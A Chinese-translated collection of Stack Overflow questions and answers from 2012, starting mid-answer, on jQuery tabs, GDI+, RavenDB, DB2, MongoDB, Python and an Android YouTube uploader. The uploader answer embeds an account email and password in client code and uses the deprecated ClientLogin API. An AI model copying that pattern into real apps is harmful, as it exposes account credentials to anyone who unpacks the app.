## 回答 #1

> 赞同：2
> 
> 时间：2012-04-20T12:29:18.340

您应该改用 css @font-face 属性。

您可以在此处阅读有关此内容的更多信息：

[http://nicewebtype.com/notes/2009/10/30/how-to-use-css-font-face/](http://nicewebtype.com/notes/2009/10/30/how-to-use-css-font-face/)

要生成字体，您可以尝试 www.fontsquirrel.com

但是，我怀疑您是否可以使用 calibri 作为字体字体。您应该首先检查字体的许可证。

# jquery - jQuery 选项卡 - 使当前选项卡从单独的导航中突出显示

> ID：10246199
> 
> 赞同：0
> 
> 时间：2012-04-20T12:24:16.377
> 
> 标签：jquery, tabs

作为用户的第一个问题，所以请在这个菜鸟上放轻松！

无论如何，有一个关于 jQuery 选项卡的快速问题。不是 UI 版本，而是不同的版本。我想要做的是能够从单独的导航区域激活链接，但让选定的选项卡显示为“当前”这是我正在使用的脚本：

```
<script type="text/javascript">
$(document).ready(function(){
$('#tabs div').hide();
$('#tabs div:first').show();
$('#tabs ul li:first').addClass('active');

$('#tabs ul li a').click(function(){
    $('#tabs ul li').removeClass('active');
    $(this).parent().addClass('active');
    var currentTab = $(this).attr('href');
    $('#tabs div').hide();
    $(currentTab).show();
    return false;
});
$('#sitenav ul li a').click(function(){
        $('#tabs ul li').removeClass('active');
        $(this).parent('#tabs ul li a').addClass('active');
        var currentTab = $(this).attr('href');
        $('#tabs div').hide();
        $(currentTab).show();
        return false;
});
});
</script> 
```

这是访问此的辅助导航：

```
<div id="sitenav">
    <ul>
    <li class="home"><a href="/search/">Search ISU...</a></li>
    <li><a href="#tab1" title="Faculty/Staff">Faculty/Staff</a></li>
    <li><a href="#tab2" title="Student">Student</a></li>
    <li><a href="#tab3" title="Department">Department</a></li>
    <li><a href="#tab4" title="Website">Website</a></li>
    </ul>   
</div> 
```

仅出于美学原因，以下是实际选项卡区域的原始导航：

```
<div id="tabs">
<ul>
<li><a href="#tab1">Faculty/Staff</a></li>
<li><a href="#tab2">Student</a></li>
<li><a href="#tab3">Departments</a></li>
<li><a href="#tab4">ISU Website</a></li>
</ul> 
```

（“标签” div 的结束标签位于文档底部，包含所有内容区域，工作正常……仅供参考！:)）

我能够做的是让“sitenav”实际链接到其他区域，但对于我的生活，我无法让标签突出显示并成为“当前”。当然这是我一直忽略的小东西，但也许新鲜的眼睛可能会看到它！谢谢你们！

编辑：天哪……差点忘了。这是这个东西的测试版本，有点像：[www.indstate.edu/search/index1.htm](http://www.indstate.edu/search/index1.htm)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T12:31:22.520

因此，如果您单击#tab1，您希望在另一个列表中突出显示吗？我会这样做：

```
$('#sitenav ul li a').click(function(){
    $('#tabs ul li').removeClass('active');
    var currentTab = $(this).attr('href');
    $('#tabs ul li a[href="'+currentTab +'"]').parent().addClass('active');
    $('#tabs div').hide();
    $(currentTab).show();
    return false;
}); 
```

如果您从另一个页面导航，该页面将从头开始呈现，因此您在最后一页上设置的活动选项卡或哈希无关紧要。如果要选择活动选项卡并显示激活的元素，则必须在页面加载时执行此操作。所以在那种情况下，我会确保在我的 css`#tabs div`中，默认情况下`display: none;`没有一个`li`s 有`active`类。你需要这样的东西：

```
$(document).ready(function(){
    var currentTab;
    if(window.location.hash){
       // check if this is an existing tab
        if($('#tabs ul li a[href="'+window.location.hash+'"]').length > 0){
             currentTab = window.location.hash;
        }
    }
    if(currentTab){
       //select and show the current tab
       $('#tabs ul li a[href="'+currentTab +'"]').parent().addClass('active');
       $(currentTab).show();
    } else {
       //select and show the first tab
       $('#tabs div:first').show();
       $('#tabs ul li:first').addClass('active');  
    }
}); 
```

# c# - 在 GDI+ 中绘制很多矩形

> ID：10246200
> 
> 赞同：5
> 
> 时间：2012-04-20T12:24:17.250
> 
> 标签：c#, performance, gdi+

我有一个应用程序在 C# 中使用 GDI+ 绘制了很多小矩形（大约 100 万个），并且性能......不太好。我知道构造很多`Rectangle`对象来传递它们`Graphis.FillRectangle`需要一些时间。`Rectangle`我也明白，如果s 逐帧变化，我无法避免这种情况，因为`Rectangle`它被设计为不可变的。因此，我的问题是：除非`Rectangle`必须假定所有 s 都是可见的，否则是否有可能提高此绘图调用的性能？

在此先感谢，克里斯托夫

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-20T12:25:39.653

我建议您改用调用的数组变体：

```
FillRectangles(Brush brush, Rectangle[] rects); 
```

如果这对您不起作用，因为您需要不同的画笔等，您应该按状态（画笔）对基元进行分组，并一次绘制每个数组。快速测试显示性能至少提高了三倍，即单独绘制 300K 矩形感觉与一次绘制 1M 矩形一样波涛汹涌。

# database - 我无法将文档放入带有凭据的数据库中

> ID：10246201
> 
> 赞同：0
> 
> 时间：2012-04-20T12:24:19.920
> 
> 标签：database, authentication, ravendb

我是 ravendb 的新手。请原谅我缺乏理解。首先我创建了一个 createUser 函数。在这个函数中，我允许一个用户使用两个数据库（名为 db1 和 db2）。

```
 public void createUser(DocumentStore documentStore, string userName, string password)
        {
            using (var session = documentStore.OpenSession())
            {
                AuthenticationUser user1 = new AuthenticationUser
                {
                    Name = userName,
                    Id = "Raven/users/NewUser",
                    AllowedDatabases = new[] { "db1", "db2" },
                    Admin = true,
                }.SetPassword(password);
                session.Store(user1);
                session.SaveChanges();
            }
        } 
```

创建用户后，我想在该数据库中创建一个带有凭据的文档但是在提供正确的凭据后，它给了我一个异常“远程服务器返回错误：（401）未经授权。”

```
public CreateDocumentResult CreateDocument(DocumentStore documentStore,string databaseName, string collectionName, string documentName)
        {

                NetworkCredential credential = new NetworkCredential("raj", "raj");
                //documentStore.Credentials = credential;
                var doc = documentStore.DatabaseCommands.ForDatabase(databaseName,credential);
                var docExist = doc.Get(documentName);
                DefaultD defaultDocument = new DefaultD();

                if (docExist == null)
                {
                    using (var session = documentStore.OpenSession(databaseName,credential)) 
                    {
                        Guid etag;
                        etag = Guid.NewGuid();
                        RavenJObject metadata=new RavenJObject();
                        metadata.Add("Raven-Entity-Name", collectionName);
                        createDocumentResult.FinalDocument=session.Advanced.DatabaseCommands.Put(documentName, etag, RavenJObject.FromObject(defaultDocument), metadata);

                        session.SaveChanges();
                      }
                } 
```

我从 Ravendb 身份验证视频中学到了这些东西。当然，我缺少某些东西。如何验证用户身份，请告诉我方法。非常感谢

# sql - 在 DB2 Store 过程中使用 IF 语句

> ID：10246203
> 
> 赞同：1
> 
> 时间：2012-04-20T12:24:28.357
> 
> 标签：sql, stored-procedures, db2

我将如何使用 IF 和 ELSE 语句来定义基于“深度整数”运行多少存储过程？（例如，如果用户使用 1 作为深度周长，则只处理第一部分）

```
--#SET TERMINATOR /

CREATE PROCEDURE STOREP2(IN str_in VARCHAR(1), IN depth INTEGER )
                    LANGUAGE SQL MODIFIES SQL DATA
                    DYNAMIC RESULT SETS 1

CRSUBJ: BEGIN

DECLARE C1 CURSOR WITH RETURN FOR 

SELECT T1.COLUMN1, T1.COLUMN2 FROM TABLE1 AS T1 WHERE T1.COLUMN1=str_in

UNION

SELECT T2.COLUMN1, T2.COLUMN2 FROM TABLE1 AS T1, TABLE1 AS T2 WHERE T1.COLUMN1=str_in AND T2.COLUMN1=T1.COLUMN2

UNION 

SELECT T3.COLUMN1, T3.COLUMN2 FROM TABLE1 AS T1, TABLE1 AS T2, TABLE1 AS T3 WHERE T1.COLUMN1=str_in AND T2.COLUMN1=T1.COLUMN2 AND T3.COLUMN1=T2.COLUMN2 

UNION 

SELECT T4.COLUMN1, T4.COLUMN2 FROM TABLE1 AS T1, TABLE1 AS T2, TABLE1 AS T3, TABLE1 AS T4 WHERE T1.COLUMN1=str_in AND T2.COLUMN1=T1.COLUMN2 AND T3.COLUMN1=T2.COLUMN2 AND T4.COLUMN1=T3.COLUMN2;

OPEN C1;
RETURN;

END CRSUBJ/ 
```

谢谢 ：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T12:40:14.197

[检查文档。](http://publib.boulder.ibm.com/infocenter/db2luw/v8/index.jsp?topic=/com.ibm.db2.udb.doc/admin/r0005649.htm)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T12:51:32.667

更具体地说：在你的例子中 - 你不能。您有效执行的是对 TABLE1 的四个查询并将结果游标返回，因此它在调用者面前显示为一个表。这将有助于了解更多的表结构以及您尝试实现的目标以帮助您解决问题。

# javascript - 我可以通过 id 从 Mongo 检索多个文档吗？

> ID：10246204
> 
> 赞同：14
> 
> 时间：2012-04-20T12:24:28.510
> 
> 标签：javascript, node.js, mongodb

我有一个 id 数组，我想一次检索所有这些。这可能吗，我可以以某种方式传递一组 id 并将它们全部返回给我吗？如果是这样，怎么做？

我正在使用节点本机驱动程序。

谢谢！

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-04-20T12:40:32.837

你需要使用`$in`运算符，这会给你想要的结果。

[https://docs.mongodb.com/manual/reference/operator/query/in/](https://docs.mongodb.com/manual/reference/operator/query/in/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2022-01-14T12:57:21.023

使用[$in](https://docs.mongodb.com/manual/reference/operator/query/in/)运算符，您可以执行以下操作：

```
const ids = ["123", "456","789"]
const items = await db
     .collection("items")
     .find({ "_id": { "$in": ids.map(id => new ObjectId(id)) } })
     .toArray() 
```

# python - Python CGI 应用程序中的 os.times()

> ID：10246206
> 
> 赞同：1
> 
> 时间：2012-04-20T12:24:46.077
> 
> 标签：python

我无法理解`os.times()`. 从[http://docs.python.org/library/os.html](http://docs.python.org/library/os.html)：

> 返回一个浮点数的 5 元组，以秒为单位表示累积（处理器或其他）时间。这些项目是：用户时间、系统时间、孩子的用户时间、孩子的系统时间，以及从过去的固定点开始经过的实时时间，按此顺序。请参阅 Unix 手册页 times(2) 或相应的 Windows 平台 API 文档。在 Windows 上，仅填充前两项，其他项为零。

在命令上查找任何其他资源似乎有点挑战性。

假设每个 CGI 调用都会产生一个新的 python 进程：a 的以下结果的前两个值`os.times()`实际上告诉我什么？如果我使用它们，我实际测量的是什么？

`(0.2184014, 0.17160109999999998, 0.0, 0.0, 0.0)`

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-20T13:00:13.943

它们告诉您在程序代码（即 python 解释器）和操作系统内核代码（即处理由 python 解释器进行的系统调用）中分别花费了多少处理器时间（而不是等待 I/O 操作的时间），通过这个过程到此为止。

[文档引用的times(2) 手册页](http://linux.die.net/man/2/times)以及[time(7) 手册页](http://linux.die.net/man/7/time)中有更多详细信息。

# javascript - 使用 jQuery 来“ping”一个 URL

> ID：10246211
> 
> 赞同：1
> 
> 时间：2012-04-20T12:25:38.670
> 
> 标签：javascript, jquery, tumblr

这个 jQuery[脚本](http://like-button.tumblr.com/)创建了一个 URL `www.tumblr.com/like/fGKvAJgQ?id=16664837215`，然后使用 an`iframe`将带有上述 URL 的“喜欢”发送到 Tumblr 的服务器。

```
$(document).on('click', '.like', function (event) {

    event.preventDefault();

    var command = $(this).hasClass('liked') ? 'unlike' : 'like',
        post = $(this).closest('.post'),
        oauth = post.find('.reblog').attr('href').slice(-8),
        id = post.attr('id'),
        likeUrl = 'http://www.tumblr.com/' + command + '/' + oauth + '?id=' + id;

    $('#like-it').attr('src', likeUrl);
    $(this).toggleClass('liked');

}); 
```

在 HTML 中使用：

```
<article id="{PostID}">
    <a href="{ReblogURL}" class="reblog">reblog</a>
    <a href="#" class="like">like</a>
</article>

<iframe id="like-it"></iframe> 
```

有没有办法将此信息发送到 Tumblr，而不是使用 iframe 和 jQuery？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T12:46:05.583

不，由于安全原因，这是不可能的。

在任何你看到一个like按钮的地方，它都是一个iframe，因为如果域、协议或端口不匹配，你就无法使用JavaScript访问父页面的iframe。

这是因为如果用户访问您的页面，您可以通过向每个页面发送 ajax 请求来强制他喜欢数百万个页面。

# android - android youtube使用静态用户名和密码上传视频

> ID：10246212
> 
> 赞同：13
> 
> 时间：2012-04-20T12:25:38.697
> 
> 标签：android, youtube-api

我正在将视频上传到 youtube，默认情况下会上传给已登录 google 帐户的用户。

但我想设置所有视频都应该使用我的静态 gmailID 和密码上传

是否可以使用静态电子邮件 ID 和密码直接登录谷歌帐户？

或任何其他好的 api 或示例在 youtube 中上传视频。

提前致谢....

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2014-03-25T13:07:56.010

**[我已将MAC 的答案](https://stackoverflow.com/a/10432215/703851)中提到的项目的上传功能包装到单个实用程序类中：**

这是`YoutubeUploader.java`

```
import java.io.BufferedReader;
import java.io.Closeable;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Set;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.ParserConfigurationException;

import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore.Video;
import android.util.Log;

public class YoutubeUploader {

    private static final String TAG = "YoutubeUploader";

    // After creating project at http://www.appspot.com DEFAULT_YTD_DOMAIN == <Developers Console Project ID>.appspot.com [ You can find from Project -> Administration -> Application settings]
    public static final String DEFAULT_YTD_DOMAIN = "developerconsolid.appspot.com";

    // I used Google APIs Console Project Title as Domain name: 
    public static final String DEFAULT_YTD_DOMAIN_NAME = "Domain Name";

    //From Google Developer Console from same project (Created by SHA1; project package)
    //Example https://console.developers.google.com/project/apps~gtl-android-youtube-test/apiui/credential
    public static final String DEVELOPER_KEY = "developer key";

    // CLIENT_ID == Google APIs Console Project Number: 
    public static final String CLIENT_ID = "client_id";

    public static final String YOUTUBE_AUTH_TOKEN_TYPE = "youtube";

    private static final String AUTH_URL = "https://www.google.com/accounts/ClientLogin";

    // Uploader's user-name and password
    private static final String USER_NAME = "usersemail@useremail.usersemail";
    private static final String PASSWORD = "userspassword";

    private static final String INITIAL_UPLOAD_URL = "https://uploads.gdata.youtube.com/resumable/feeds/api/users/default/uploads";

    private static String getClientAuthToken() {

        try {

            URL url = new URL(AUTH_URL);

            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setRequestMethod("POST");
            urlConnection.setDoOutput(true);
            urlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

            String template = "Email=%s&Passwd=%s&service=%s&source=%s";

            String userName = USER_NAME; // TODO
            String password = PASSWORD; // TODO

            String service = YOUTUBE_AUTH_TOKEN_TYPE; 
            String source = CLIENT_ID;

            userName = URLEncoder.encode(userName, "UTF-8");
            password = URLEncoder.encode(password, "UTF-8");

            String loginData = String.format(template, userName, password, service, source);

            OutputStreamWriter outStreamWriter = new OutputStreamWriter(urlConnection.getOutputStream());
            outStreamWriter.write(loginData);
            outStreamWriter.close();

            int responseCode = urlConnection.getResponseCode();

            if (responseCode != 200) {

                Log.d(TAG, "Got an error response : " + responseCode + " "  + urlConnection.getResponseMessage());

                throw new IOException(urlConnection.getResponseMessage());

            } else {

                InputStream is = urlConnection.getInputStream();
                InputStreamReader isr = new InputStreamReader(is);
                BufferedReader br = new BufferedReader(isr);
                String line = null;

                while ((line = br.readLine()) != null) {

                    if (line.startsWith("Auth=")) {

                        String split[] = line.split("=");
                        String token = split[1];

                        Log.d(TAG, "Auth Token : " + token);
                        return token;
                    }
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

        return null;
    }

    public static String upload(YoutubeUploadRequest uploadRequest, ProgressListner listner, Activity activity) {

        totalBytesUploaded = 0;

        String authToken = getClientAuthToken();

        if(authToken != null) {

            String uploadUrl = uploadMetaData(uploadRequest, authToken, activity, true);

            File file = getFileFromUri(uploadRequest.getUri(), activity);

            long currentFileSize = file.length();

            int uploadChunk = 1024 * 1024 * 3; // 3MB

            int start = 0;
            int end = -1;

            String videoId = null;

            double fileSize = currentFileSize;

            while (fileSize > 0) {

                if (fileSize - uploadChunk > 0) {
                    end = start + uploadChunk - 1;
                } else {
                    end = start + (int) fileSize - 1;
                }

                Log.d(TAG, String.format("start=%s end=%s total=%s", start, end, file.length()));

                try {

                    videoId = gdataUpload(file, uploadUrl, start, end, authToken, listner);
                    fileSize -= uploadChunk;
                    start = end + 1;
                } catch (IOException e) {
                    Log.d(TAG,"Error during upload : " + e.getMessage());
                }
            }

            if (videoId != null) {
                return videoId;
            }
        }

        return null;
    }

    public static int totalBytesUploaded = 0;

    @SuppressLint("DefaultLocale")
    @SuppressWarnings("resource")
    private static String gdataUpload(File file, String uploadUrl, int start, int end, String clientLoginToken, ProgressListner listner) throws IOException {

        int chunk = end - start + 1;
        int bufferSize = 4096;
        byte[] buffer = new byte[bufferSize];
        FileInputStream fileStream = new FileInputStream(file);

        URL url = new URL(uploadUrl);
        HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
        urlConnection.setRequestProperty("Authorization", String.format("GoogleLogin auth=\"%s\"",  clientLoginToken));
        urlConnection.setRequestProperty("GData-Version", "2");
        urlConnection.setRequestProperty("X-GData-Client", CLIENT_ID);
        urlConnection.setRequestProperty("X-GData-Key", String.format("key=%s", DEVELOPER_KEY));
        // some mobile proxies do not support PUT, using X-HTTP-Method-Override to get around this problem

        urlConnection.setRequestMethod("POST");
        urlConnection.setRequestProperty("X-HTTP-Method-Override", "PUT");
        urlConnection.setDoOutput(true);

        urlConnection.setFixedLengthStreamingMode(chunk);
        urlConnection.setRequestProperty("Content-Type", "video/3gpp");
        urlConnection.setRequestProperty("Content-Range", String.format("bytes %d-%d/%d", start, end,
                file.length()));

        Log.d(TAG, urlConnection.getRequestProperty("Content-Range"));

        OutputStream outStreamWriter = urlConnection.getOutputStream();

        fileStream.skip(start);

        double currentFileSize = file.length();

        int bytesRead;
        int totalRead = 0;
        while ((bytesRead = fileStream.read(buffer, 0, bufferSize)) != -1) {
            outStreamWriter.write(buffer, 0, bytesRead);
            totalRead += bytesRead;
            totalBytesUploaded += bytesRead;

            double percent = (totalBytesUploaded / currentFileSize) * 100;

            if(listner != null){
                listner.onUploadProgressUpdate((int) percent);
            }

            System.out.println("GTL You tube upload progress: " + percent + "%");
             /*
                Log.d(LOG_TAG, String.format(
                "fileSize=%f totalBytesUploaded=%f percent=%f", currentFileSize,
                totalBytesUploaded, percent));
             */

            //dialog.setProgress((int) percent);
            // TODO My settings

            if (totalRead == (end - start + 1)) {
                break;
            }
        }

        outStreamWriter.close();

        int responseCode = urlConnection.getResponseCode();

        Log.d(TAG, "responseCode=" + responseCode);
        Log.d(TAG, "responseMessage=" + urlConnection.getResponseMessage());

        try {
            if (responseCode == 201) {
                String videoId = parseVideoId(urlConnection.getInputStream());

                return videoId;
            } else if (responseCode == 200) {
                Set<String> keySet = urlConnection.getHeaderFields().keySet();
                String keys = urlConnection.getHeaderFields().keySet().toString();
                Log.d(TAG, String.format("Headers keys %s.", keys));
                for (String key : keySet) {
                    Log.d(TAG, String.format("Header key %s value %s.", key, urlConnection.getHeaderField(key)));          
                }
                Log.w(TAG, "Received 200 response during resumable uploading");
                throw new IOException(String.format("Unexpected response code : responseCode=%d responseMessage=%s", responseCode,
                        urlConnection.getResponseMessage()));
            } else {
                if ((responseCode + "").startsWith("5")) {
                    String error = String.format("responseCode=%d responseMessage=%s", responseCode,
                            urlConnection.getResponseMessage());
                    Log.w(TAG, error);
                    // TODO - this exception will trigger retry mechanism to kick in
                    // TODO - even though it should not, consider introducing a new type so
                    // TODO - resume does not kick in upon 5xx
                    throw new IOException(error);
                } else if (responseCode == 308) {
                    // OK, the chunk completed succesfully 
                    Log.d(TAG, String.format("responseCode=%d responseMessage=%s", responseCode,
                            urlConnection.getResponseMessage()));
                } else {
                    // TODO - this case is not handled properly yet
                    Log.w(TAG, String.format("Unexpected return code : %d %s while uploading :%s", responseCode,
                            urlConnection.getResponseMessage(), uploadUrl));
                }
            }
        } catch (ParserConfigurationException e) {
            e.printStackTrace();
        } catch (SAXException e) {
            e.printStackTrace();
        }

        return null;
    }

    private static String parseVideoId(InputStream atomDataStream) throws ParserConfigurationException,
    SAXException, IOException {
        DocumentBuilderFactory docBuilderFactory = DocumentBuilderFactory.newInstance();
        DocumentBuilder docBuilder = docBuilderFactory.newDocumentBuilder();
        Document doc = docBuilder.parse(atomDataStream);

        NodeList nodes = doc.getElementsByTagNameNS("*", "*");
        for (int i = 0; i < nodes.getLength(); i++) {
            Node node = nodes.item(i);
            String nodeName = node.getNodeName();
            if (nodeName != null && nodeName.equals("yt:videoid")) {
                return node.getFirstChild().getNodeValue();
            }
        }
        return null;
    }

    private static File getFileFromUri(Uri uri, Activity activity) {

        try {
            String filePath = null;

            String[] proj = { Video.VideoColumns.DATA };

            Cursor cursor = activity.getContentResolver().query(uri, proj, null, null, null);

            if(cursor.moveToFirst()) {
                int column_index = cursor.getColumnIndexOrThrow(Video.VideoColumns.DATA);
                filePath = cursor.getString(column_index);
            }

            cursor.close();

            //String filePath = cursor.getString(cursor.getColumnIndex(Video.VideoColumns.DATA));

            File file = new File(filePath);
            cursor.close();
            return file;
        } catch (Exception e) {
            e.printStackTrace();
        }

        return null;
    }

    private static String uploadMetaData(YoutubeUploadRequest uploadRequest, String clientLoginToken, Activity activity, boolean retry) {

        try {

            File file = getFileFromUri(uploadRequest.getUri(), activity);

            if(file != null) {

                String uploadUrl = INITIAL_UPLOAD_URL;
                URL url = new URL(uploadUrl);

                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestProperty("Authorization", String.format("GoogleLogin auth=\"%s\"", clientLoginToken));
                connection.setRequestProperty("GData-Version", "2");
                connection.setRequestProperty("X-GData-Client", CLIENT_ID);
                connection.setRequestProperty("X-GData-Key", String.format("key=%s", DEVELOPER_KEY));

                connection.setRequestMethod("POST");
                connection.setDoOutput(true);
                connection.setRequestProperty("Content-Type", "application/atom+xml");
                connection.setRequestProperty("Slug", file.getAbsolutePath());

                String title = uploadRequest.getTitle();
                String description = uploadRequest.getDescription();
                String category = uploadRequest.getCategory();
                String tags = uploadRequest.getTags();

                String template = readFile(activity, R.raw.gdata).toString();
                String atomData = String.format(template, title, description, category, tags);

                /*String template = readFile(activity, R.raw.gdata_geo).toString();
                atomData = String.format(template, title, description, category, tags,
                    videoLocation.getLatitude(), videoLocation.getLongitude());*/

                OutputStreamWriter outStreamWriter = new OutputStreamWriter(connection.getOutputStream());
                outStreamWriter.write(atomData);
                outStreamWriter.close();

                int responseCode = connection.getResponseCode();

                if (responseCode < 200 || responseCode >= 300) {

                    // The response code is 40X

                    if ((responseCode + "").startsWith("4") && retry) {

                        Log.d(TAG, "retrying to fetch auth token for ");

                        clientLoginToken = getClientAuthToken();

                        // Try again with fresh token
                        return uploadMetaData(uploadRequest, clientLoginToken, activity, false);
                    } else {
                        return null;
                    }
                }

                return connection.getHeaderField("Location");
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

        return null;
    }

    public static CharSequence readFile(Activity activity, int id) {
        BufferedReader in = null;
        try {
            in = new BufferedReader(new InputStreamReader(activity.getResources().openRawResource(id)));
            String line;
            StringBuilder buffer = new StringBuilder();
            while ((line = in.readLine()) != null) {
                buffer.append(line).append('\n');
            }
            // Chomp the last newline
            buffer.deleteCharAt(buffer.length() - 1);
            return buffer;
        } catch (IOException e) {
            return "";
        } finally {
            closeStream(in);
        }
    }

    /**
     * Closes the specified stream.
     *
     * @param stream The stream to close.
     */
    private static void closeStream(Closeable stream) {
        if (stream != null) {
            try {
                stream.close();
            } catch (IOException e) {
                // Ignore
            }
        }
    }  

    public static interface ProgressListner {

        void onUploadProgressUpdate(int progress);
    }
} 
```

这是`YoutubeUploadRequest.java`

```
import android.net.Uri;

public class YoutubeUploadRequest {

    private static final String DEFAULT_VIDEO_CATEGORY = "News";
    private static final String DEFAULT_VIDEO_TAGS = "mobile";

    private String title;
    private String strUri;
    private String description;
    private String category = DEFAULT_VIDEO_CATEGORY;
    private String tags = DEFAULT_VIDEO_TAGS;

    public String getDescription() {
        return description;
    }
    public void setDescription(String description) {
        this.description = description;
    }
    public String getCategory() {
        return category;
    }
    public void setCategory(String category) {
        this.category = category;
    }
    public String getTags() {
        return tags;
    }
    public void setTags(String tags) {
        this.tags = tags;
    }
    public String getStrUri() {
        return strUri;
    }
    public void setStrUri(String strUri) {
        this.strUri = strUri;
    }
    public Uri getUri() {
        return Uri.parse(strUri);
    }
    public void setUri(Uri uri) {
        this.strUri = uri.toString();
    }
    public String getTitle() {
        return title;
    }
    public void setTitle(String title) {
        this.title = title;
    }
} 
```

你也需要`raw/gdata.xml`

```
<?xml version="1.0"?> <entry xmlns="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" xmlns:yt="http://gdata.youtube.com/schemas/2007"> <media:group> <media:title type="plain">%s</media:title> <media:description type="plain">%s</media:description> <media:category scheme="http://gdata.youtube.com/schemas/2007/categories.cat">%s</media:category> <media:keywords>%s</media:keywords> </media:group> </entry> 
```

这是使用它的示例活动：`MainActivity.java`

```
import java.util.List;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.Toast;

import com.example.trialanderror.YoutubeUploader.ProgressListner;

public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";

    private static final int CAPTURE_RETURN = 1;
    private static final int GALLERY_RETURN = 2;
    private static final int SUBMIT_RETURN = 3;

    private ProgressBar progressBar;

    private Button btnCaptureVideo;
    private Button btnSelectFromGallery;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        btnCaptureVideo = (Button) findViewById(R.id.btnCaptureVideo);
        btnCaptureVideo.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {

                Intent i = new Intent();
                i.setAction("android.media.action.VIDEO_CAPTURE");
                startActivityForResult(i, CAPTURE_RETURN);
            }
        });

        btnSelectFromGallery = (Button) findViewById(R.id.btnSelectFromGallery);
        btnSelectFromGallery.setOnClickListener(new OnClickListener() {

            @Override
            public void onClick(View v) {

                Intent intent = new Intent();
                intent.setAction(Intent.ACTION_PICK);
                intent.setType("video/*");

                List<ResolveInfo> list = getPackageManager().queryIntentActivities(intent,  PackageManager.MATCH_DEFAULT_ONLY);
                if (list.size() <= 0) {
                    Log.d(TAG, "no video picker intent on this hardware");
                    return;
                }

                startActivityForResult(intent, GALLERY_RETURN);
            }
        });

        progressBar = (ProgressBar) findViewById(R.id.progressBar);

        progressBar.setVisibility(View.GONE);
        btnSelectFromGallery.setEnabled(true);
        btnCaptureVideo.setEnabled(true);
    }

    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        switch (requestCode) {
        case CAPTURE_RETURN:
        case GALLERY_RETURN:
            if (resultCode == RESULT_OK) {

                /*Intent intent = new Intent(this, SubmitActivity.class);
                intent.setData(data.getData());
                startActivityForResult(intent, SUBMIT_RETURN);*/

                progressBar.setVisibility(View.VISIBLE);
                btnSelectFromGallery.setEnabled(false);
                btnCaptureVideo.setEnabled(false);  

                uploadYoutube(data.getData());  
            }
            break;
        case SUBMIT_RETURN:
            if (resultCode == RESULT_OK) {
                Toast.makeText(MainActivity.this, "thank you!", Toast.LENGTH_LONG).show();
            } else {
                // Toast.makeText(DetailsActivity.this, "submit failed or cancelled",
                // Toast.LENGTH_LONG).show();
            }
            break;
        }
    }

    private void uploadYoutube(final Uri data) {

        new AsyncTask<Void, Integer, Void>() {

            @Override
            protected Void doInBackground(Void... params) {
                YoutubeUploadRequest request = new YoutubeUploadRequest();
                request.setUri(data);
                //request.setCategory(category);
                //request.setTags(tags);
                request.setTitle("MPRJ Video Tite");
                request.setDescription("MPRJ Video Test");

                YoutubeUploader.upload(request, new ProgressListner() {

                    @Override
                    public void onUploadProgressUpdate(int progress) {

                        publishProgress(progress);
                    }
                }, MainActivity.this);
                return null;
            }

            @Override
            protected void onProgressUpdate(Integer... values) {
                progressBar.setProgress(values[0]);

                if(values[0] == 100){
                    progressBar.setVisibility(View.GONE);
                    btnSelectFromGallery.setEnabled(true);
                    btnCaptureVideo.setEnabled(true);
                }
            };
        }.execute();
    }
} 
```

示例活动的布局`activity_main.xml`

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:gravity="center"
    android:orientation="vertical"
    android:paddingBottom="@dimen/activity_vertical_margin"
    android:paddingLeft="@dimen/activity_horizontal_margin"
    android:paddingRight="@dimen/activity_horizontal_margin"
    android:paddingTop="@dimen/activity_vertical_margin"
    tools:context=".MainActivity" >

    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginBottom="20dp"
        android:text="@string/upload_video" />

    <Button
        android:id="@+id/btnCaptureVideo"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="@string/capture_video" />

    <Button
        android:id="@+id/btnSelectFromGallery"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_marginTop="15dp"
        android:text="@string/select_from_gallery" />

    <ProgressBar
        android:id="@+id/progressBar"
        style="?android:attr/progressBarStyleHorizontal"
        android:layout_marginTop="15dp"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content" />

</LinearLayout> 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-05-03T13:16:44.770

我已成功上传 youtube 视频。

*   录制视频并上传
